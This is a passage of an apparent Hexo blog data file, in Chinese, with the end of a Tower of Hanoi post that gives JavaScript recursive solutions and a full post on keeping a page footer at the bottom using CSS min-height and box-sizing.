class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    hanoi(n - <span class=\"number\">1</span>, x, z, y, moves);</span><br><span class=\"line\">    move(n, x, z);</span><br><span class=\"line\">    hanoi(n - <span class=\"number\">1</span>, y, x, z, moves);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> moves;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(hanoiStack(<span class=\"number\">3</span>));</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(hanoi(<span class=\"number\">3</span>, <span class=\"string\">\"A\"</span>, <span class=\"string\">\"B\"</span>, <span class=\"string\">\"C\"</span>));</span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1>","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>有三根相邻的柱子，标号为 A,B,C，A 柱子上从下到上按金字塔状叠放着 n 个不同大小的圆盘，要把所有盘子一个一个移动到柱子 B 上，并且每次移动同一根柱子上都不能出现大盘子在小盘子上方，请问至少需要多少次移动，设移动次数为 H(n）。<br><img src=\"/数据结构与算法@汉诺塔/overview.jpg\" alt=\"汉诺塔玩具模型图\"></p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>汉诺塔：汉诺塔（又称河内塔）问题是源于印度一个古老传说的益智玩具。大梵天创造世界的时候做了三根金刚石柱子，在一根柱子上从下往上按照大小顺序摞着 64 片黄金圆盘。大梵天命令婆罗门把圆盘从下面开始按大小顺序重新摆放在另一根柱子上。并且规定，在小圆盘上不能放大圆盘，在三根柱子之间一次只能移动一个圆盘。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">towerOfHanoi</span>(<span class=\"params\"></span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">  plates,</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">  source,</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">  helper,</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">  dest,</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">  sourceName,</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">  helperName,</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">  destName,</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">  moves = []</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (plates &lt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> moves;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (plates === <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    dest.push(source.pop());</span><br><span class=\"line\">    <span class=\"keyword\">const</span> move = &#123;&#125;;</span><br><span class=\"line\">    move[sourceName] = source.toString();</span><br><span class=\"line\">    move[helperName] = helper.toString();</span><br><span class=\"line\">    move[destName] = dest.toString();</span><br><span class=\"line\">    moves.push(move);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    towerOfHanoi(</span><br><span class=\"line\">      plates - <span class=\"number\">1</span>,</span><br><span class=\"line\">      source,</span><br><span class=\"line\">      dest,</span><br><span class=\"line\">      helper,</span><br><span class=\"line\">      sourceName,</span><br><span class=\"line\">      destName,</span><br><span class=\"line\">      helperName,</span><br><span class=\"line\">      moves</span><br><span class=\"line\">    );</span><br><span class=\"line\">    dest.push(source.pop());</span><br><span class=\"line\">    <span class=\"keyword\">const</span> move = &#123;&#125;;</span><br><span class=\"line\">    move[sourceName] = source.toString();</span><br><span class=\"line\">    move[helperName] = helper.toString();</span><br><span class=\"line\">    move[destName] = dest.toString();</span><br><span class=\"line\">    moves.push(move);</span><br><span class=\"line\">    towerOfHanoi(</span><br><span class=\"line\">      plates - <span class=\"number\">1</span>,</span><br><span class=\"line\">      helper,</span><br><span class=\"line\">      source,</span><br><span class=\"line\">      dest,</span><br><span class=\"line\">      helperName,</span><br><span class=\"line\">      sourceName,</span><br><span class=\"line\">      destName,</span><br><span class=\"line\">      moves</span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> moves;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hanoiStack</span>(<span class=\"params\">plates</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> source = <span class=\"keyword\">new</span> Stack2();</span><br><span class=\"line\">  <span class=\"keyword\">const</span> dest = <span class=\"keyword\">new</span> Stack2();</span><br><span class=\"line\">  <span class=\"keyword\">const</span> helper = <span class=\"keyword\">new</span> Stack2();</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = plates; i &gt; <span class=\"number\">0</span>; i--) &#123;</span><br><span class=\"line\">    source.push(i);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> towerOfHanoi(plates, source, helper, dest, <span class=\"string\">\"source\"</span>, <span class=\"string\">\"helper\"</span>, <span class=\"string\">\"dest\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// function hanoi0(plates, source, helper, dest, moves = []) &#123;</span></span><br><span class=\"line\"><span class=\"comment\">//   if (plates &lt;= 0) &#123;</span></span><br><span class=\"line\"><span class=\"comment\">//     return moves;</span></span><br><span class=\"line\"><span class=\"comment\">//   &#125;</span></span><br><span class=\"line\"><span class=\"comment\">//   if (plates === 1) &#123;</span></span><br><span class=\"line\"><span class=\"comment\">//     moves.push([source, dest]);</span></span><br><span class=\"line\"><span class=\"comment\">//   &#125; else &#123;</span></span><br><span class=\"line\"><span class=\"comment\">//     hanoi(plates - 1, source, dest, helper, moves);</span></span><br><span class=\"line\"><span class=\"comment\">//     moves.push([source, dest]);</span></span><br><span class=\"line\"><span class=\"comment\">//     hanoi(plates - 1, helper, source, dest, moves);</span></span><br><span class=\"line\"><span class=\"comment\">//   &#125;</span></span><br><span class=\"line\"><span class=\"comment\">//   return moves;</span></span><br><span class=\"line\"><span class=\"comment\">// &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hanoi</span>(<span class=\"params\">n, x, y, z, moves = []</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> move = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">id, from, to</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(id + <span class=\"string\">\"号盘从\"</span> + <span class=\"keyword\">from</span> + <span class=\"string\">\"移动到\"</span> + to);</span><br><span class=\"line\">    moves.push([<span class=\"keyword\">from</span>, to]);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (n &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    hanoi(n - <span class=\"number\">1</span>, x, z, y, moves);</span><br><span class=\"line\">    move(n, x, z);</span><br><span class=\"line\">    hanoi(n - <span class=\"number\">1</span>, y, x, z, moves);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> moves;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(hanoiStack(<span class=\"number\">3</span>));</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(hanoi(<span class=\"number\">3</span>, <span class=\"string\">\"A\"</span>, <span class=\"string\">\"B\"</span>, <span class=\"string\">\"C\"</span>));</span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1>"},{"title":"页脚居底最简单实现","date":"2019-06-28T07:57:22.000Z","updated":"2019-06-28T07:57:22.000Z","_content":"\n# 概述\n\n仅用简单的 css 实现页脚始终居于页面底部。主要知识点为`min-height:100%`和`box-sizing:border-box`。\n\n<!-- more -->\n\n# 详述\n\n## 直接看代码：\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"UTF-8\" />\n    <title>页脚居底最简单实现</title>\n    <style>\n      /* reset */\n      body {\n        margin: 0;\n        padding: 0;\n      }\n      header {\n        height: 80px;\n        background-color: antiquewhite;\n      }\n      footer {\n        height: 60px;\n        background-color: brown;\n      }\n\n      /* 核心实现部分 */\n      html {\n        height: 100%;\n      }\n      body {\n        position: relative;\n        min-height: 100%;\n        box-sizing: border-box; /* 设置高度包括padding */\n        padding-bottom: 60px; /* footer 的高度，为 footer 占位 */\n      }\n      footer {\n        position: absolute;\n        bottom: 0;\n        left: 0;\n        width: 100%;\n        height: 60px;\n      }\n    </style>\n  </head>\n  <body>\n    <header>this is header content</header>\n    <section>this is main content</section>\n    <footer>this is footer content</footer>\n  </body>\n</html>\n```\n\n## 注意点一\n\n设置 body 的`min-height: 100%;`需要设置 html 的高度为 100%。\n\n## 注意点二\n\nCSS 中的 box-sizing 属性定义了宿主环境应该如何计算一个元素的总宽度和总高度。\n\n在 CSS 盒子模型的默认定义里，你对一个元素所设置的 width 与 height 只会应用到这个元素的内容区。如果这个元素有任何的 border 或 padding ，绘制到屏幕上时的盒子宽度和高度会加上设置的边框和内边距值。这意味着当你调整一个元素的宽度和高度时需要时刻注意到这个元素的边框和内边距。当我们实现响应式布局时，这个特点尤其烦人。\n\nbox-sizing 属性可以被用来调整这些表现:\n\n- content-box 是默认值。如果你设置一个元素的宽为 100px，那么这个元素的内容区会有 100px 宽，并且任何边框和内边距的宽度都会被增加到最后绘制出来的元素宽度中。\n- border-box 告诉浏览器：你想要设置的边框和内边距的值是包含在 width 内的。也就是说，如果你将一个元素的 width 设为 100px，那么这 100px 会包含它的 border 和 padding，内容区的实际宽度是 width 减去(border + padding)的值。大多数情况下，这使得我们更容易地设定一个元素的宽高。\n\n# 参考\n\nhttps://developer.mozilla.org/zh-CN/docs/Web/CSS/box-sizing\n","source":"_posts/2019/06/footer-bottom.md","raw":"---\ntitle: 页脚居底最简单实现\npermalink: footer-bottom\ntags:\n  - CSS\ncategories:\n  - 其他\ndate: 2019-06-28 15:57:22\nupdated: 2019-06-28 15:57:22\n---\n\n# 概述\n\n仅用简单的 css 实现页脚始终居于页面底部。主要知识点为`min-height:100%`和`box-sizing:border-box`。\n\n<!-- more -->\n\n# 详述\n\n## 直接看代码：\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"UTF-8\" />\n    <title>页脚居底最简单实现</title>\n    <style>\n      /* reset */\n      body {\n        margin: 0;\n        padding: 0;\n      }\n      header {\n        height: 80px;\n        background-color: antiquewhite;\n      }\n      footer {\n        height: 60px;\n        background-color: brown;\n      }\n\n      /* 核心实现部分 */\n      html {\n        height: 100%;\n      }\n      body {\n        position: relative;\n        min-height: 100%;\n        box-sizing: border-box; /* 设置高度包括padding */\n        padding-bottom: 60px; /* footer 的高度，为 footer 占位 */\n      }\n      footer {\n        position: absolute;\n        bottom: 0;\n        left: 0;\n        width: 100%;\n        height: 60px;\n      }\n    </style>\n  </head>\n  <body>\n    <header>this is header content</header>\n    <section>this is main content</section>\n    <footer>this is footer content</footer>\n  </body>\n</html>\n```\n\n## 注意点一\n\n设置 body 的`min-height: 100%;`需要设置 html 的高度为 100%。\n\n## 注意点二\n\nCSS 中的 box-sizing 属性定义了宿主环境应该如何计算一个元素的总宽度和总高度。\n\n在 CSS 盒子模型的默认定义里，你对一个元素所设置的 width 与 height 只会应用到这个元素的内容区。如果这个元素有任何的 border 或 padding ，绘制到屏幕上时的盒子宽度和高度会加上设置的边框和内边距值。这意味着当你调整一个元素的宽度和高度时需要时刻注意到这个元素的边框和内边距。当我们实现响应式布局时，这个特点尤其烦人。\n\nbox-sizing 属性可以被用来调整这些表现:\n\n- content-box 是默认值。如果你设置一个元素的宽为 100px，那么这个元素的内容区会有 100px 宽，并且任何边框和内边距的宽度都会被增加到最后绘制出来的元素宽度中。\n- border-box 告诉浏览器：你想要设置的边框和内边距的值是包含在 width 内的。也就是说，如果你将一个元素的 width 设为 100px，那么这 100px 会包含它的 border 和 padding，内容区的实际宽度是 width 减去(border + padding)的值。大多数情况下，这使得我们更容易地设定一个元素的宽高。\n\n# 参考\n\nhttps://developer.mozilla.org/zh-CN/docs/Web/CSS/box-sizing\n","slug":"footer-bottom","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8y30081wovv9yvta91m","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>仅用简单的 css 实现页脚始终居于页面底部。主要知识点为<code>min-height:100%</code>和<code>box-sizing:border-box</code>。</p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"直接看代码：\"><a href=\"#直接看代码：\" class=\"headerlink\" title=\"直接看代码：\"></a>直接看代码：</h2><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"en\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>页脚居底最简单实现<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"css\">      <span class=\"comment\">/* reset */</span></span></span><br><span class=\"line\"><span class=\"undefined\">      body &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        margin: 0;</span></span><br><span class=\"line\"><span class=\"undefined\">        padding: 0;</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">      header &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        height: 80px;</span></span><br><span class=\"line\"><span class=\"undefined\">        background-color: antiquewhite;</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">      footer &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        height: 60px;</span></span><br><span class=\"line\"><span class=\"undefined\">        background-color: brown;</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"css\">      <span class=\"comment\">/* 核心实现部分 */</span></span></span><br><span class=\"line\"><span class=\"undefined\">      html &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        height: 100%;</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">      body &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        position: relative;</span></span><br><span class=\"line\"><span class=\"undefined\">        min-height: 100%;</span></span><br><span class=\"line\"><span class=\"css\">        <span class=\"selector-tag\">box-sizing</span>: <span class=\"selector-tag\">border-box</span>; <span class=\"comment\">/* 设置高度包括padding */</span></span></span><br><span class=\"line\"><span class=\"css\">        <span class=\"selector-tag\">padding-bottom</span>: 60<span class=\"selector-tag\">px</span>; <span class=\"comment\">/* footer 的高度，为 footer 占位 */</span></span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">      footer &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        position: absolute;</span></span><br><span class=\"line\"><span class=\"undefined\">        bottom: 0;</span></span><br><span class=\"line\"><span class=\"undefined\">        left: 0;</span></span><br><span class=\"line\"><span class=\"undefined\">        width: 100%;</span></span><br><span class=\"line\"><span class=\"undefined\">        height: 60px;</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    </span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">header</span>&gt;</span>this is header content<span class=\"tag\">&lt;/<span class=\"name\">header</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">section</span>&gt;</span>this is main content<span class=\"tag\">&lt;/<span class=\"name\">section</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">footer</span>&gt;</span>this is footer content<span class=\"tag\">&lt;/<span class=\"name\">footer</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"注意点一\"><a href=\"#注意点一\" class=\"headerlink\" title=\"注意点一\"></a>注意点一</h2><p>设置 body 的<code>min-height: 100%;</code>需要设置 html 的高度为 100%。</p>\n<h2 id=\"注意点二\"><a href=\"#注意点二\" class=\"headerlink\" title=\"注意点二\"></a>注意点二</h2><p>CSS 中的 box-sizing 属性定义了宿主环境应该如何计算一个元素的总宽度和总高度。</p>\n<p>在 CSS 盒子模型的默认定义里，你对一个元素所设置的 width 与 height 只会应用到这个元素的内容区。如果这个元素有任何的 border 或 padding ，绘制到屏幕上时的盒子宽度和高度会加上设置的边框和内边距值。这意味着当你调整一个元素的宽度和高度时需要时刻注意到这个元素的边框和内边距。当我们实现响应式布局时，这个特点尤其烦人。</p>\n<p>box-sizing 属性可以被用来调整这些表现:</p>\n<ul>\n<li>content-box 是默认值。如果你设置一个元素的宽为 100px，那么这个元素的内容区会有 100px 宽，并且任何边框和内边距的宽度都会被增加到最后绘制出来的元素宽度中。</li>\n<li>border-box 告诉浏览器：你想要设置的边框和内边距的值是包含在 width 内的。也就是说，如果你将一个元素的 width 设为 100px，那么这 100px 会包含它的 border 和 padding，内容区的实际宽度是 width 减去(border + padding)的值。大多数情况下，这使得我们更容易地设定一个元素的宽高。</li>\n</ul>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/CSS/box-sizing\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/zh-CN/docs/Web/CSS/box-sizing</a></p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>仅用简单的 css 实现页脚始终居于页面底部。主要知识点为<code>min-height:100%</code>和<code>box-sizing:border-box</code>。</p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"直接看代码：\"><a href=\"#直接看代码：\" class=\"headerlink\" title=\"直接看代码：\"></a>直接看代码：</h2><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"en\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>页脚居底最简单实现<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"css\">      <span class=\"comment\">/* reset */</span></span></span><br><span class=\"line\"><span class=\"undefined\">      body &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        margin: 0;</span></span><br><span class=\"line\"><span class=\"undefined\">        padding: 0;</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">      header &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        height: 80px;</span></span><br><span class=\"line\"><span class=\"undefined\">        background-color: antiquewhite;</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">      footer &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        height: 60px;</span></span><br><span class=\"line\"><span class=\"undefined\">        background-color: brown;</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"css\">      <span class=\"comment\">/* 核心实现部分 */</span></span></span><br><span class=\"line\"><span class=\"undefined\">      html &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        height: 100%;</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">      body &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        position: relative;</span></span><br><span class=\"line\"><span class=\"undefined\">        min-height: 100%;</span></span><br><span class=\"line\"><span class=\"css\">        <span class=\"selector-tag\">box-sizing</span>: <span class=\"selector-tag\">border-box</span>; <span class=\"comment\">/* 设置高度包括padding */</span></span></span><br><span class=\"line\"><span class=\"css\">        <span class=\"selector-tag\">padding-bottom</span>: 60<span class=\"selector-tag\">px</span>; <span class=\"comment\">/* footer 的高度，为 footer 占位 */</span></span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">      footer &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        position: absolute;</span></span><br><span class=\"line\"><span class=\"undefined\">        bottom: 0;</span></span><br><span class=\"line\"><span class=\"undefined\">        left: 0;</span></span><br><span class=\"line\"><span class=\"undefined\">        width: 100%;</span></span><br><span class=\"line\"><span class=\"undefined\">        height: 60px;</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    </span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">header</span>&gt;</span>this is header content<span class=\"tag\">&lt;/<span class=\"name\">header</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">section</span>&gt;</span>this is main content<span class=\"tag\">&lt;/<span class=\"name\">section</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">footer</span>&gt;</span>this is footer content<span class=\"tag\">&lt;/<span class=\"name\">footer</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"注意点一\"><a href=\"#注意点一\" class=\"headerlink\" title=\"注意点一\"></a>注意点一</h2><p>设置 body 的<code>min-height: 100%;</code>需要设置 html 的高度为 100%。</p>\n<h2 id=\"注意点二\"><a href=\"#注意点二\" class=\"headerlink\" title=\"注意点二\"></a>注意点二</h2><p>CSS 中的 box-sizing 属性定义了宿主环境应该如何计算一个元素的总宽度和总高度。</p>\n<p>在 CSS 盒子模型的默认定义里，你对一个元素所设置的 width 与 height 只会应用到这个元素的内容区。如果这个元素有任何的 border 或 padding 